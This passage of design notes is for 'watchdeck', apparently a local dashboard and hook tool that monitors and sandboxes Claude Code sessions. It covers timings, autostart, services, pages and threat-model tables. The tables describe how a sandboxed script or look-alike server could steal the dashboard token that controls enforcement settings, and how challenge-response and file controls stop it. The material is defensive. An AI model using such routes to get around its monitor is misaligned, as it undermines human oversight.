| PreToolUse no-opinion (after: includes the marker touch) | 6.08 / 6.19 / 6.12 | 6.21 / 6.41 / 6.19 |
| PreToolUse rewrite | 6.59 / 6.35 / 6.32 | 6.78 / 6.37 / 6.43 |
| SessionStart (record + marker every spawn) | 6.19 / 6.03 / 6.00 | 6.56 / 6.51 / 6.41 |
| UserPromptSubmit (throttled: marker read + touch) | 6.01 / 6.20 / 5.68 | 6.25 / 6.17 / 6.06 |

p95 stayed under 8.2 ms for every payload. The no-opinion median moved +0.07 to +0.22 ms (limit +1 ms). SessionStart is about 0.4 ms above the old no-opinion path and well under the 10 ms target. Stripped binary 9,317,410 → 9,351,090 bytes (+33 KB). `GODEBUG=inittrace=1`: no watchdeck package has init work.

**Not verified yet (2026-10-13).**

- An interactive session; `source` values `resume`, `clear`, `compact`; SessionEnd reasons other than `other`. The resume rule is designed from the hooks docs.
- The plugin route (`--plugin-dir`) delivering the three events to `bin/hook.sh`; only `--settings` was captured.
- Whether SessionEnd always fires (a killed terminal, a crash). A session without an end record goes idle after 10 min and stays idle; nothing prunes stale markers yet (only `.tmp-*` leftovers are pruned).
- Linux: the code is portable, not run there.

### Always-on dashboard (M5.3, 2026-10-13)

The owner chose an always-on dashboard: it can start with each Claude Code session, run as a login service, and keep one link that works across restarts. M5.3 built everything except the trigger. M5.2 added the hook point (`lifecycle.OnSessionStart`, nil by default); since 2026-10-13 `watchdeck hook` sets it to call `uistate.EnsureRunning` (see "Autostart trigger" below).

**One dashboard per state dir.** `internal/uistate` keeps three files in `<stateDir>` (`${XDG_STATE_HOME:-~/.local/state}/watchdeck`, created 0700, a looser existing dir tightened):

| File | Mode | Content |
|---|---|---|
| `ui.json` | 0600 | `{v, pid, port, started, version, binary, mode, no_transcripts, last_port}`. Written atomically (temp file, rename) twice per start: right after the server takes the lock, `{pid: self, port: 0, last_port: <old port>}` (`MarkStarting`), so nothing probes the old port before the new server holds it; then the full record once it listens. The server checks every 15 s that `ui.json` still names it and rewrites it if not. On exit the pid is set to 0 and the port kept |
| `ui.token` | 0600 | 32 random bytes, base64url (43 characters). Persistent: created once with `O_EXCL` and reused by every later start, so a link or a remembered token survives restarts. It changes only on `ui --rotate-token`, when a start finds its recorded port taken, or when the file does not hold a well-formed token |
| `ui.lock` | 0600 | held with `flock(LOCK_EX\|LOCK_NB)` for the server's lifetime |

Every open in the dir uses `O_NOFOLLOW`. A symlink at any of the three is refused, and a write replaces it by rename instead of writing through it (`TestFilesRefuseSymlinks`). Modes: `TestStateFile0600`.

**Single instance and health.**

- The lock decides whether a server runs, not `ui.json`. The kernel drops a `flock` when its holder dies, so a stale `ui.json` naming a live, recycled pid never counts. No pid is ever signalled or probed with `kill(pid, 0)` (`TestStaleStateRecycledPid`, `TestStaleStateRecycledPidCommand`). `Locked` creates nothing when the lock file is absent.
- Health is an authenticated `GET /api/status` within 500 ms, preceded by a challenge-response (`internal/uiproof`). The probe first sends `GET /api/status` without the token, carrying `X-Watchdeck-Challenge: <32 random bytes, base64url>`. The dashboard's 401 to that request carries `X-Watchdeck-Proof: base64url(HMAC-SHA256(token, "watchdeck-probe|<port>|" + challenge))`, where `<port>` is the server's own listening port, and the client checks it in constant time (`hmac.Equal`) against the port it probed. A relay on another port that forwards the challenge to the real dashboard gets a proof for the dashboard's port, which fails (`TestRelayedProofFails`). Only then does it send the bearer. A look-alike that copies the 401 and the CSP, such as a listener a sandboxed script with `network: localhost` bound on a recycled port, cannot produce the proof and never receives the token. `Running`, `WaitRunning`, `Stop`, `ui`, `--ensure`, `--detach`, `service` and doctor all go through this probe. Tests: `TestMimicNeverReceivesBearer` (a mimic answering 401+CSP and 200 to any bearer, behind a held lock and a stale `ui.json`; probe, `Running`, `WaitRunning` and `Stop` send it nothing), `TestProbeNeverSendsTokenToAForeignServer`, `TestProbeProof`, `TestProbe`, `TestProbeTimesOut`. Before this change, a verifier's mimic on 2026-10-13 collected 63 bearers from `ui --stop` and parallel `--ensure` runs over a stale `ui.json`.
- The proof needs the token, so it says only "this server holds the token"; the HMAC is keyed by the token and reveals nothing about it. The server answers a proof only on `GET /api/status`, only for a well-formed challenge and after the Host check.
- Residual: `Stop` sends its two bearer requests to the port it just probed. A server that dies in the milliseconds between the probe and those requests, with a squatter binding the port in that gap, would receive them. Not tested.
- A second server in the same state dir retries the lock for 1 s (a `Locked` check by another process holds it for a moment), then waits up to 2 s for the first to answer, reports it, and exits 0 (`TestSecondInstanceExits`, `TestSecondInstanceExitsCommand`).

**Modes.**

| Mode | Started by | Idle exit | Working directory |
|---|---|---|---|
| manual | `watchdeck ui` from a terminal, `--detach` | 30 min (`--idle`) | the terminal's |
| auto | `ui --ensure`, later the SessionStart hook | none | none |
| service | `ui --service` (launchd, systemd) | none | none |

`/api/status` reports `mode` and `pid`. `TestServiceModeNoIdle` checks that a service ignores `--idle`.

**Commands.**

- `watchdeck ui` reuses a healthy dashboard. It opens the browser at that dashboard's URL (its token in the fragment), or prints the URL with `--no-open`, and says on stderr that `--port`, `--idle` and `--no-transcripts` do not apply. `--detach` does the same before it would spawn (`TestUIEnsureReuseAndStop`).
- **Stable port.** Without `--port`, the server binds the port `ui.json` last recorded when it is free (`TestStableTokenAndPortAcrossRestart`). With the persistent token, a remembered tab or bookmark keeps working across restarts. When that port is taken by another process, the server listens on a free port, **rotates the token** and says so on stderr: a browser that remembered the token on the old origin may already have handed it to whatever serves there (`TestPortTakenRotatesToken`).
- `--ensure` without `--open` is one `flock` attempt and, when the lock was free, one fork/exec of `<binary> ui --mode auto --no-open` in its own session (`Setsid`), with stdio on `/dev/null` and cwd `/`. It never waits for the server and never probes it. With `--open` it waits up to 5 s for the dashboard to answer, then opens the browser.
- `--ensure` never prints the launch URL, on any path: it runs from `/watchdeck:open` and the band's `2` key, whose output reaches the model and the transcript. When the browser cannot be opened it exits 1 with "could not open a browser (…); run `watchdeck ui` in a terminal" on stderr (`TestEnsureNeverPrintsToken`, spawn and running paths, with and without `--open`). `ui` and `--detach` from a terminal still print the URL when no browser opens.
- `--stop` sends `GET /api/shutdown` for a one-use nonce (the same pool and 5-minute TTL as `/api/enforce`; nonces are tagged by purpose, so an enforce nonce cannot stop the server and a shutdown nonce cannot edit settings: `TestShutdownNonceOneUse`). It then sends `POST /api/shutdown` with the dashboard's own `Origin` and `Content-Type: application/json`, and waits up to 5 s for the lock to be released. The server answers 202, shuts down gracefully and exits 0. Launchd and systemd restart only on failure, so a stopped service stays stopped until the next login.
- `--rotate-token` writes a new `ui.token`. A running server reads the token through `uistate.TokenWatcher`, which re-reads the file when it changes (another file, size or mtime). So the old token is refused on the next request, without a restart (`TestRotateToken`, `TestRotateTokenCommand`, `TestTokenSourceSwitches`). An unreadable token file refuses every request.

**`--ensure` timing** (darwin arm64, 2026-10-13, a machine that was not idle):

- In process, `uistate.Ensure`, best of 5: 1.8 ms on the spawn path, 0.04 ms when a server already runs (`TestEnsureReturnsFast`, budget 50 ms).
- The whole `watchdeck ui --ensure` command, process start included, 10 runs each, timed with Perl's `Time::HiRes` around `system()` (so a `sh -c` is included): 12–22 ms on the spawn path, 23–32 ms when a server already runs. From the Go test harness the already-running command took 5–7 ms (median of 5).

Both are under the 50 ms budget.

**Hook fast path** (`scripts/measure-hook.sh` with BEFORE at the revision before M5.3, darwin arm64, 200 spawns, two runs, 2026-10-13). No-opinion median 5.60 → 5.55 ms and 5.59 → 6.10 ms (−0.05 and +0.51 ms), p95 −0.27 and +0.20 ms, all within the limits (+1 ms median, +2 ms p95); the verifier's own run measured −0.07 ms. Binary 9.37 → 9.99 MB unstripped (+626 KB). No watchdeck package has init work.

**Go API for M5.2.** `uistate.EnsureRunning(paths, binary)` returns at once when `WATCHDECK_UI_AUTOSTART=off`, or when `ui.autostart` in `config.yaml` is not `true`. The default, before `setup` asked, is off. Otherwise it calls `Ensure` in auto mode: one config read, one `flock` attempt and at most one fork/exec. With autostart off it does not touch the state dir (`TestEnsureRunningRespectsAutostart`). **Autostart trigger (2026-10-13).** `cmd/watchdeck/hookcmd.go` sets `lifecycle.OnSessionStart` to call `EnsureRunning` with the hook's own resolved binary, after the SessionStart record is written and inside the hook's panic guard; errors are ignored. The spawned server's stdio is `/dev/null`, so the hook prints nothing and does not wait for it. Test: `TestSessionStartAutostart` (built binary, temp HOME): unset or `WATCHDECK_UI_AUTOSTART=off` starts nothing; on, the dashboard comes up in auto mode; a second session reuses it; the hook prints nothing in every case. The trigger runs only after the start record is written, so `WATCHDECK_LIFECYCLE=off`, an invalid session id or a failed marker write also leave the dashboard unstarted. The spawned server gets an allowlisted environment (`uistate.DaemonEnv`: PATH, HOME, USER, LOGNAME, SHELL, TMPDIR, LANG, LC_*, TZ, BROWSER, XDG_*, CLAUDE_CONFIG_DIR, WATCHDECK_*), so session variables such as API keys never sit in a long-lived daemon (`TestDaemonEnvAllowlist`). Not verified: an interactive Claude Code session starting it.

**`setup` asks again.** It asks "Start the dashboard automatically with each Claude Code session? [y/N]" on a terminal only, with the saved answer as the default. `--yes`, or no terminal, keeps the current setting and writes nothing (`TestSetupAsksAutostart`). On a yes, setup says the session hook starts the dashboard when a session starts (the lifecycle hooks must be installed) and points at `service install` for starting it at login instead.

**Login service** (`internal/service`, `watchdeck service install|uninstall|status [--dry-run] [--yes]`).

- macOS: `~/Library/LaunchAgents/com.pandataps.watchdeck.plist`. ProgramArguments `<abs binary> ui --service`, `RunAtLoad`, `KeepAlive {SuccessfulExit: false}` (restart on a crash only), `ProcessType Background`, `Umask 077`, stdout and stderr to `<stateDir>/ui.log`. Loaded with `launchctl bootout gui/<uid>/com.pandataps.watchdeck` (an older copy; failure ignored), then `launchctl bootstrap gui/<uid> <plist>`.
- Linux: `${XDG_CONFIG_HOME:-~/.config}/systemd/user/watchdeck-ui.service` with `Restart=on-failure`, `UMask=0077` and `StandardOutput`/`StandardError=append:<stateDir>/ui.log`. Loaded with `systemctl --user daemon-reload` and `enable --now`; removed with `disable --now`.
- A service does not inherit the login shell. So the location variables set at install time (`XDG_CONFIG_HOME`, `XDG_CACHE_HOME`, `XDG_STATE_HOME`, `CLAUDE_CONFIG_DIR`, `WATCHDECK_ACTIVITY`) are written into the plist or unit; without them the service would use other dirs than the CLI. A value with a newline is dropped. A binary path that is relative or holds a newline or NUL is refused.
- Install creates the state dir (0700) and `ui.log` (0600, `O_NOFOLLOW`) itself, so the service manager does not create the log with its own mode. It confirms first: `--yes` skips the question, and with no terminal nothing is changed. It stops a running manual or auto dashboard first; otherwise the service's server would lose the lock, exit 0, and not be restarted.
- The binary path written into the service is `os.Executable` with symlinks resolved. Inside a Homebrew Cellar (`<prefix>/Cellar/watchdeck/<version>/bin/watchdeck`) it is mapped to `<prefix>/opt/watchdeck/bin/watchdeck` when that resolves to the same file, so `brew upgrade` does not leave the service pointing at a removed version (`service.StableBinary`, `TestStableBinaryHomebrew`). Another install location is written as is; after moving the binary, rerun `service install`.
- `ui.log` rotation: when a service starts and its stdout is `ui.log` over 1 MiB, the server renames it to `ui.log.1` (replacing an older one) and puts a fresh `ui.log` (0600, `O_NOFOLLOW`) on fds 1 and 2. Designed and built; not run under launchd or systemd.
- Uninstall leaves `ui.log` and `ui.log.1` in the state dir and says so. On macOS it reports a failed `launchctl bootout` when `launchctl print` showed the service loaded, and then keeps the plist so a rerun can try again; a bootout of a service that was not loaded is not an error (`TestInstallDarwinWithFakeRunner`).
- Every external command goes through `service.Options.Runner`, and the package has no default runner. The command's runner is a package variable that `TestMain` replaces with one that panics, so no test reaches `launchctl` or `systemctl`.
- Tests: golden files in `internal/service/testdata/` (`TestPlistGolden`, `TestUnitGolden`; the plist passes `plutil -lint`), escaping (`TestEscaping`), and install, status and uninstall through a fake runner (`TestInstallDarwinWithFakeRunner`, `TestInstallLinuxWithFakeRunner`, `TestServiceInstallViaFakeRunner`).

**Working directory optional.** In auto and service mode, `ui.Options.Cwd` and `mapapi.Deps.Cwd` are empty: the server has no project of its own.

- The project-scoped routes (`/api/status`, `/api/skills`, `/api/skills/{name}` and the grant route's row, `/api/enforce`, `/api/sessions`, `/api/sessions/{id}/map`) then work in user scope, or take `?project=<absolute root>`.
- The value must be absolute and already clean (no trailing `/`, no `..`). It must equal the server's own cwd, its git root, or a root known from the session index (`Entry.Cwd`) or the newest 5000 activity records, each cwd with its git root (`internal/projectscope`, cached 15 s). Anything else is 400, with a message that does not echo the value (`TestCwdlessProjectParam`, `TestCwdlessSessionsAndMap`, `TestResolve`).
- `paths.ProjectRoot("")` is now `""`; before, it resolved against the process's own cwd.
- Since M5.5 the value may also be the `~/<rel>` display form the API serves (`projectscope.Expand`; `..` segments are refused), and the known roots come from the session catalog (index, lifecycle and the whole activity log) instead of a 15 s cache of the index and the newest 5000 records. The Flow page sends the session's own project on every map request, so an auto or service dashboard finds any session's transcript (`TestCwdlessMapViaProject`).

**Remember me** (`internal/ui/static/app.js`; the "This browser" card on the Enforce page). It is opt-in and off by default. When on, the token is also kept in `localStorage` on `http://127.0.0.1:<port>`, so a new tab or a browser restart opens without a launch link. When off, the token lives in the tab's `sessionStorage` only, as before. A launch link replaces a remembered token. Any 401 clears both stored copies and shows the lock-out notice, which says to run `watchdeck ui`. The card states the residual risk of a program squatting the port while the dashboard is down (threat table below).

**Threat model, additions (2026-10-13).** The guard (Host, Origin, bearer, loopback-only bind) is unchanged.

| Asset | Threat | Control | Evidence |
|---|---|---|---|
| `ui.token` on disk | read by another process | 0600 in a 0700 dir. Code running as the user can already edit `settings.json` and `overrides.yaml` directly, so the file gives such code nothing new. The new exposure is sandboxed skill scripts, and the whole state dir is denied to them for read and write (`runner`, landed with M5.4) | `TestStateFile0600`, `TestSandboxDeniesStateDir` |
| `ui.token`, `ui.json`, `ui.lock` | a planted symlink redirecting a read or write | `O_NOFOLLOW` opens, rename-based writes, `O_EXCL` on create | `TestFilesRefuseSymlinks` |
| The token | sent by a probe or `--stop` to a look-alike on the recorded port (a recycled port, a listener bound by a sandboxed script with `network: localhost`) | challenge-response first: the 401 must carry HMAC-SHA256(token, port, challenge) for the probed port, checked in constant time, before any bearer is sent; no proxy, no keep-alive, no redirects; a starting server sets `port: 0` in `ui.json` before it listens | `TestMimicNeverReceivesBearer`, `TestRelayedProofFails`, `TestStartingServerHidesOldPort`, `TestProbeNeverSendsTokenToAForeignServer`, `TestProbeProof` |
| The token | printed into the conversation by `/watchdeck:open` or the mod | `--ensure` never prints the URL; an opener failure exits 1 and points at `watchdeck ui` in a terminal | `TestEnsureNeverPrintsToken`; mod test "the band key 2 ensures the dashboard and never toasts a token" |
| Two dashboards | two servers writing `overrides.yaml` and settings at once, or a stale `ui.json` trusted | `flock` for the server's lifetime; a stale `ui.json` is never trusted without the lock and a probe; the lock holder re-asserts `ui.json` every 15 s | `TestSecondInstanceExits`, `TestStaleStateRecycledPid` |
| Shutdown | a page or local process stopping the dashboard | the full guard (Host, Origin, `Sec-Fetch-Site`, JSON, bearer) plus a one-use nonce | `TestStopRequiresAuth`, `TestShutdownNonceOneUse` |
| `?project=` | pointing the server at an arbitrary directory | only the server's cwd, its git root, or a root the index or activity log already names | `TestCwdlessProjectParam`, `TestCwdlessSessionsAndMap` |
| Remember me | the token persisting in a browser profile, or read by a program squatting the port | opt-in; scoped to the `127.0.0.1:<port>` origin; any 401 clears it; `--rotate-token` ends every remembered token; a start that finds the recorded port taken rotates the token. Residual risk, stated on the card too: while the dashboard is down, another local program (a sandboxed script with `network: localhost` included) can listen on that port and serve its own page on the same origin, which can read the remembered token when the browser opens it. Rotation at the next start makes that token worthless, but it was readable until then. Anyone using that browser profile can also use the dashboard until rotation | a manual Chromium check (below); no automated test |
| The service | running with other dirs than the CLI, or restarted after a deliberate stop | location variables copied into the plist or unit; `KeepAlive.SuccessfulExit=false` and `Restart=on-failure`, and `--stop` exits 0 | `TestPlistGolden`, `TestUnitGolden`, `TestSecondInstanceExitsCommand` (exit 0 after `--stop`) |

**Deviation.** `watchdeck demo` keeps `ui --detach --open --no-transcripts` instead of moving to `--ensure`. The demo dashboard needs the demo project as its cwd and should keep its idle exit, and an auto-mode dashboard has neither. Its state dir is in the demo tree, so it never meets the user's dashboard.

**Not verified yet (2026-10-13).**

- launchd and systemd for real. The plist and unit were checked only by goldens and `plutil -lint`; neither was loaded. Also open: whether launchd keeps `ui.log` at 0600 when it opens a file that already exists, and whether `append:` works on the target systemd (it needs systemd 240 or later).
- The SessionStart trigger (M5.2), and so the whole "starts with each session" path.
- Remember me in Safari and Firefox. It was checked once by hand in Playwright's Chromium on 2026-10-13, against an empty temp HOME and an auto-mode dashboard: ticking the box stored the token; a reload with `sessionStorage` cleared and no fragment opened unlocked; after `ui --rotate-token` the reload showed the lock-out text and `localStorage` was empty; the console showed only the expected 401 and no CSP violation. No automated browser test covers it.
- `watchdeck ui --stop` against a service, followed by the next login.
- `ui.log` rotation at service start (dup onto fds 1 and 2) under a real launchd or systemd.
- Linux: only `GOOS=linux go vet` ran.
- The front end sending `?project=`: done in M5.5 (Flow map requests).

### Sessions page (M5.5, 2026-10-13)

**Sessions** (`#/sessions`; the home page from M5.5 until the Overview took that place on 2026-10-14, below) lists every Claude Code session on the machine, in every project. "Live now" cards sit on top (project, branch, model, the skill script running if any, the last denial, a live or idle dot, Open flow), then a table filtered by project, state, date range and "has denials", with a search box (`/` focuses it) over the full session text. A row, or a card's button, opens `#/flow/<id>`. Screenshot: `docs/images/sessions-live.png` (fixture home only).

**The session catalog** (`internal/sessionsapi`, server only, init-free). One `Catalog` per dashboard merges three sources into an immutable snapshot that handlers read:

- the session index (M5.4): metadata of every transcript and the search text;
- the lifecycle store (M5.2): live, idle, ended, or unknown (no record, no marker; such a session counts as live only while its transcript's mtime is under 30 s old);
- the activity log, read by offset (`activity.ReadFrom`, which is `Read` with `After`): per session decisions, asks, asks with an ungranted request, denials (the same rule as the M4 list: `denied` records, runs with a hint or an outcome of `policy_error`, `no_sandbox`, `usage`), runs, skills, agent types, the newest denial, and the running skill (the newest decision that rewrote a command and has no run record yet, under 10 min old, on a live session). On a reset (rotation or truncation) the counts are rebuilt from both files. `Join` runs per read, so a run read in a later poll than its decision is attributed only when it was joined at write time (`joined_by: write`, which carries the session id and `tool_use_id`); heuristic joins across a poll boundary are not made. Records with no session id form the per-cwd "direct runs" row, with the same id as `mapapi` gives it, so the row links to the same map (`TestDetail`).

`sessionindex.Index` is not safe for concurrent use. The catalog holds it behind an `RWMutex`: `Update` under the write half, `Entries`, `Get` and `Search` under the read half. One goroutine (`Catalog.Start`) refreshes: a full refresh (index `Update`, lifecycle, activity) every 15 s; and every 1 s a `Stat` of `sessions.jsonl` and the live dir (a size or mtime change triggers a full refresh at once) and of the activity log (a change triggers a light refresh: lifecycle and activity only). Marker touches do not change the live dir's mtime, so live → idle shows up on the 15 s refresh. A request that arrives before the first refresh builds one synchronously. Test: `TestConcurrentRefreshAndReads` under `-race` (the goroutine at 5 ms/20 ms, four readers, a writer growing a transcript and the log).

Under `--no-transcripts` the index is never opened or written and no transcript is read. Sessions come from `transcript.DiscoverAll` (directory listings and `Stat`), the lifecycle records and the activity log, with no title, model, branch, turn count or search text. `Stat` is not reading: a transcript's size and mtime still list it and still make it live by the 30 s rule (the catalog leaves `lifecycle.Store.NoTranscriptStat` off). Search answers `disabled: true` (`TestNoTranscriptsMetadataOnly`).

**Routes** (all behind the existing guard: loopback Host, bearer, security headers and CSP unchanged). `cmd/watchdeck/ui.go` drops `mapapi`'s `GET /api/sessions` and mounts the catalog's; `GET /api/sessions/{id}/map` is unchanged.

| Route | Answer |
|---|---|
| `GET /api/sessions?project&state&denials=1&since&until&q&cursor&limit` | `{sessions, next_cursor, total, transcripts, search_disabled, updated}`. Newest first by last activity (the newest of the index's last row time, the transcript mtime, the lifecycle record or marker time, and the newest activity record), then id. 100 per page at most. `state` is `live`, `idle`, `ended` or `unknown`; `since`/`until` take RFC3339 or a date (UTC; `until` inclusive of the date); `project` is a known project in either form; `q` keeps only sessions whose text matches and adds a `snippet`. Bad values are 400 with messages that never echo the value. |
| `GET /api/sessions/{id}` | The row plus `runs`, `agent_types`, `tail_read`, `text_capped`, `transcripts`, and `risk {denials, asks, ungranted_asks, ungranted[], rule_hits[]}`. `rule_hits` is designed now and always empty until M6.3 records pack hits (`{pack, rule, severity, action, count}`). An id that is neither a transcript id nor `direct:<12 hex>` is 400; an unknown one 404. |
| `GET /api/projects` | `{projects: [{project, name, sessions, live, denials, last_ts}]}`, newest first. |
| `GET /api/search?q&limit` | `{hits: [{session_id, snippet, title, project, project_name, state, last_ts}], disabled}`: at most 50 hits, one per session, newest first; a snippet is at most 240 bytes on UTF-8 boundaries (the index's own bound). `q` over 256 bytes is 400. At most two searches run at once (a third gets 429); a search is cancelled when the client goes away (`Index.SearchContext`, checked between files and between 1 MiB chunks) or after 10 s. |
| `GET /api/events` | The event stream (below). |

The cursor is base64url of `<unix nanos of the last row's sort key>|<id>`; the next page holds the rows strictly after that key. A session that becomes newer between two page requests moves to page one and neither shifts nor repeats later pages; one that was not yet shown and moves up is not shown in that walk (`TestPaginationCursorStable`).

**No absolute paths in JSON.** A project is shown in `projectscope.Display` form, `~/<rel>` under the home dir and as recorded anywhere else (the fixtures' `/Users/you/...` cwds). `projectscope.Resolve` takes the `~/` form back (`Expand`; a `..` segment is refused). Free text the catalog serves (titles, snippets, ungranted lines, denial labels) has the home dir replaced by `~` wherever the next character cannot continue a path name (`[A-Za-z0-9._-]`), so `/Users/a` before `/`, a space, a quote, `;`, `)` or the end becomes `~`, while the siblings `/Users/ab` and `/Users/a.bak` stay as they are (`TestTildeAtPathBoundary`). No transcript path, index path or state path is serialized. `TestNoAbsolutePathsInJSON` (in `internal/sessionsapi`) walks every string of every new route on five servers: with a cwd, cwd-less, cwd-less with `?project=~/…`, cwd-less with an absolute `?project=`, and `--no-transcripts`; the temp root, its real path and the home dir never appear, and a string that is a bare absolute path must be one of the fixtures' recorded cwds.

**The event stream.** `GET /api/events` (`internal/ui/api_events.go`, mounted only when `ui.Options.Events` is set) answers `text/event-stream`:

- First `retry: 5000` and `event: hello` with `{"keepalive_ms":25000}`, then `event: session` (`{id, state, prev}`, one per state change, including a new session), `event: activity` (`{sessions[], records}`, when records were appended), `event: index` (`{sessions}`, when the index read, rebuilt or pruned something or the count changed). A refresh that finds nothing new sends nothing (`TestQuietRefreshPublishesNothing`). Events are nudges: the page refetches through the ordinary routes, so a dropped event (a subscriber's 32-event buffer full) costs latency, not data.
- A `: keepalive` comment every 25 s, which also touches the idle clock, so an open page keeps a manual-mode dashboard alive as polling did.
- The server's 60 s write timeout and 30 s read timeout would cut a stream, so the handler lifts both through `http.ResponseController` and gives each write its own 10 s deadline. A client that stops reading is dropped only once the socket buffers between it and the server are full and a write then stalls for 10 s; at a few hundred bytes per event that can take long, so a stream also lives at most 1 h and the page reconnects (`TestEventsStreamMaxAge`). Checked by hand on 2026-10-13 against an auto-mode dashboard on the fixture home: `curl -N` with the bearer header stayed connected for 80 s (curl's own limit) and received three keepalives over 80 s, past both the 30 s read and 60 s write timeouts, and a `session` event for a SessionStart fed to the built binary's hook.
- At most 8 streams; the 9th gets 429 with `Retry-After: 30` (`TestStreamCapAndCleanup`). A disconnect, a write error, the 1 h lifetime, `RequestStop` or server shutdown ends a stream and releases its slot and subscription; shutdown closes streams before it waits for handlers (`TestStreamEndsOnShutdown`).
- A newline in an event's name or data is dropped, so a frame cannot be split (`TestEventsStreamFramesAndAuth`).
- Only the bearer header authenticates: no token in a query, a path or a cookie (`TestEventsRequireBearer`). No script uses `EventSource`, only `app.js` opens `/api/events`, through `rawFetch`, and no script builds a URL with a token parameter (`TestNoTokenInAnyURL`).

**Front end.** `app.js` `stream()` reads the stream with `fetch` and `body.getReader()`, parses frames on blank lines, and hands each event to store subscribers as `("event", {name, data})` and connection changes as `("stream", {connected})`. It reconnects with exponential backoff (1 s doubling to 60 s, with jitter), honours `Retry-After` on 429, waits 60 s after a 404 (an older server), and aborts a stream that has been silent for 2.5 keepalive periods (a half-open socket never errors). It stops while the tab is hidden and on a 401 (the lock-out screen). Polling never stops: `/api/activity` every 15 s while the stream is up and every 2 s while it is down, and an `activity` event polls at once. `sessions.js` reloads on any event (debounced 400 ms), and every 15 s only while the stream is down; search is debounced 250 ms and an older request is aborted. `map.js` replaces the six newest-session pills with live and idle pills (the current session always kept) plus an "All sessions" link, accepts `#/flow/<id>`, and sends the session's project as `?project=` on every map request (`TestCwdlessMapViaProject`). The default route was `#/sessions` until 2026-10-14; it is now `#/overview` (`TestOverviewPageIsHome`; the Sessions check is `TestSessionsPageRegistered`). Filters live in the tab's `sessionStorage`. Empty states say what to do: install the hooks (`watchdeck setup` or the Enforce page) and run `watchdeck demo`; a filtered view offers Clear filters; `--no-transcripts` says search is off. Checked by hand on 2026-10-13 in Playwright's Chromium against the fixture home (auto mode, so cwd-less): light and dark at 1280×800, 390 px wide with no horizontal page scroll (the header's tabs now wrap below 760 px), `/` focus, a debounced search with highlighted snippets, Open flow and a bare `#/flow/<id>` for the index-only session B, a SessionStart fed to the hook appearing as a card within 2.5 s, and no console error or CSP violation apart from the requests cut by that restart.

**CLI parity.** `watchdeck sessions` gains `--state live|idle|ended|unknown` and `--denials`, and with either flag its rows (text and `--json`) carry `state`, `decisions`, `denials` and `asks`, all from the same catalog code as the API (`TestSessionsStateAndDenials`). Without them the catalog is not built (it would add a second index pass and full reads of the lifecycle and activity logs), and rows carry none of the four. It still lists indexed sessions only, so a session the activity log or the lifecycle names but no transcript backs is on the page, not in the CLI.

**Threat model, additions.**

| Asset | Threat | Control | Evidence |
|---|---|---|---|
| The token | carried in a stream URL, logged by a proxy or kept in history | the stream is read with `fetch` and the `Authorization` header, never `EventSource`; the server accepts no other credential | `TestEventsRequireBearer`, `TestNoTokenInAnyURL` |
| The dashboard | a local process holding many streams open, or never reading | 8 streams at most (429 beyond); 10 s per write; 1 h per stream; a stream ends on disconnect or shutdown | `TestStreamCapAndCleanup`, `TestStreamEndsOnShutdown`, `TestEventsStreamMaxAge` |
| Transcript text | search exposing session content beyond the machine | search reads only the local index (0600, in the state dir sandboxed scripts cannot read), behind the same guard; snippets are at most 240 bytes; the home dir is shown as `~`. Anyone holding the token can search everything: the same trust as the map, which already shows transcripts | `TestSearchSnippetBounds`, `TestRoutesAreGuarded`, `TestNoAbsolutePathsInJSON` |
| The dashboard | a costly search used to stall it | queries capped at 256 bytes, two at a time, 10 s and client-cancelled | `TestSearchSnippetBounds` (429 when both slots are taken; a cancelled context stops the scan), `TestSearchContextCancelled` |
| `?project=` | the new `~/` form escaping home | `..` segments are refused before resolution; the expanded value must still be a known root | `TestDisplayAndExpand`, `TestResolveAcceptsDisplayForm` |

**Known limits.** A stream opened before `ui --rotate-token` stays open with the old token until it ends (every new request, the stream's own reconnect included, needs the new one). The catalog keeps per-session activity counts for the whole log in memory (a few hundred bytes per session). The Sessions table counts denials from the activity log only; the map also shows denials only the transcript reports, so the two can differ (fixture A: 1 on the page, 2 on the map).

**Not verified yet (2026-10-13).**

- Safari and Firefox (Chromium through Playwright only); a touch device.
- An interactive Claude Code session driving the page live (only a hook fed by hand and the fixture's lifecycle records).
- A home with hundreds of real sessions: the cold first index build blocks the first request until it finishes (the page shows "Indexing sessions…"); RSS and latency at that size were not measured here.
- Linux: only `GOOS=linux go vet` ran.
- A browser with a proxy or extension that buffers `text/event-stream` (the watchdog then reconnects every 62.5 s; polling covers the gap).

**Hook fast path.** `internal/sessionsapi` is linked into the hook binary: stripped size 10,043,746 → 10,162,434 bytes (+116 KB, darwin arm64, 2026-10-13). The M5.5 verifier ran `scripts/measure-hook.sh` with BEFORE at the revision before M5.5 (darwin arm64, 200 spawns): no-opinion median 4.80 → 4.75 ms, p95 5.44 → 5.41 ms. `GODEBUG=inittrace=1 watchdeck hook` lists no watchdeck package: no new init work.

### Overview page and theme (2026-10-14)

The dashboard opens on **Overview** (`#/overview`): the first tab, the brand link, the default route and the fallback for an unknown route (`TestOverviewPageIsHome`). Every other route and deep link (`#/sessions`, `#/flow/<id>`, `#/skills/<name>`, ...) lands where it did; the launch link `#t=<token>` lands on the Overview. Its screenshots left `docs/images` with the page; the Home page that replaced it is in `docs/images/home-dark.png` and `docs/images/needs-resolve.png` (fixture home only). The page (`internal/ui/static/overview.js`) answers three questions from data the app already loads; no Go route was added.

- **Am I protected?** One status from `/api/status`, read the same way as the header light so the two never disagree. *Protected*: the PreToolUse Bash hook is installed and the install is complete (or, from a server that does not report `complete`, the sandbox exclusion is set), and a sandbox backend was found. *Partly protected*: the install is incomplete; or it is complete but no backend was found, so `watchdeck run` fails closed; or the hook is not in the user settings but a decision was logged in the last 24 h (the plugin or a `claude --settings` file). *Not protected*: anything else, including an unreadable settings file. Four facts sit beside it: hooks, sandbox exclusion, backend (Seatbelt on darwin, bubblewrap on linux) and activity log. When not fully protected there is one primary action, **Turn on protection**: it fetches `/api/enforce` for the user target and a fresh nonce, then calls `enforceChange`, which is the Enforce page's own confirm dialog (it names the file and the `.bak-<timestamp>` copy) and `POST /api/enforce`, moved to module level in `pages.js` so both pages share one write path. Cancel posts nothing. A missing or unreadable user target sends the person to Enforce instead.
- **What ran?** Four tiles: skills (and how many ship scripts) from `/api/skills`; live sessions (and idle) from the `total` of `/api/sessions?state=live|idle&limit=1`, refreshed every 15 s and on `session`, `activity` and `index` events; denials in the last 24 h with the 7-day count under it; skills asking for more than their grant. **Recent activity** lists the newest 8 `decision`, `run`, `denied` and `skill_invoked` records from the activity tail `app.js` already holds; each opens its session's timeline at that event (`#/flow/timeline/<id>?hide_none=1&n=ev:<tool_use_id>:skill:<skill>`).
